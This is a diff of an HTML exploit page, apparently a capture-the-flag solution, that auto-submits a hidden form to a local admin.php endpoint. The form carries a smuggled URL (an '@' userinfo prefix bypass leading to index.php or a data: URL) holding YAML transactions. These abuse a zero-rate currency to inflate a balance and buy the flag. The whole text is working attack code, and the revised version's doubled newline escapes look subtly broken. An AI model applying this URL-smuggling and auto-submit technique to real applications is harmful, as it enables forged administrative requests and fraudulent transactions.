@@ -1,32 +1,41 @@
 <!doctype html>
-<meta charset="utf-8">
-<title>ctf exploit</title>
-<form id="f" method="post" action="http://localhost:5000/admin.php">
-  <input type="hidden" name="url" id="url">
-</form>
-<script>
-// Construct a list of transactions:
-// 1) Buy 1,000,000 units of an unknown currency (rate 0 → cost 0)
-// 2) Sell the same amount of that currency (credits balance)
-// 3) Buy 1 unit of FL (costs 1,000,000, which we now have)
-const yaml =
-  '- amount: 1000000\n' +
-  '  currency: ZZZ\n' +
-  '  op: BUY\n' +
-  '- amount: 1000000\n' +
-  '  currency: ZZZ\n' +
-  '  op: SELL\n' +
-  '- amount: 1\n' +
-  '  currency: FL\n' +
-  '  op: BUY';
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <title>CTF exploit</title>
+</head>
+<body>
+  <!-- The form will be auto-submitted -->
+  <form id="f" method="post" action="http://localhost:5000/admin.php">
+    <input type="hidden" name="url" id="url">
+  </form>
 
-// Encode the YAML for /index.php?html=...
-const encodedYaml = encodeURIComponent(yaml);
+  <script>
+    (() => {
+      // Build YAML with three transactions:
+      // 1. Buy 1,000,000 ZZZ (unknown currency, rate 0 → costs 0)
+      // 2. Sell 1,000,000 ZZZ (credits balance via the `$value ? $value : $amount` path)
+      // 3. Buy 1 FL (costs 1,000,000; we can afford it after step 2)
+      const yaml =
+        '- amount: 1000000\\n' +
+        '  currency: ZZZ\\n' +
+        '  op: BUY\\n' +
+        '- amount: 1000000\\n' +
+        '  currency: ZZZ\\n' +
+        '  op: SELL\\n' +
+        '- amount: 1\\n' +
+        '  currency: FL\\n' +
+        '  op: BUY';
 
-// Build the smuggled URL: it begins with the required prefix but actually points at our YAML on /index.php
-const smuggle = 'http://localhost:5000/admin.php@localhost:5000/index.php?html=' + encodedYaml;
+      // Encode the YAML and build the smuggled URL:
+      // The prefix must exactly match URL_PREFIX, then `@data:` introduces our YAML.
+      const smuggle =
+        'http://localhost:5000/admin.php@data:text/plain,' +
+        encodeURIComponent(yaml);
 
-// Populate the hidden input and submit
-document.getElementById('url').value = smuggle;
-document.getElementById('f').submit();
-</script>
+      document.getElementById('url').value = smuggle;
+      document.getElementById('f').submit();
+    })();
+  </script>
+</body>
+</html>
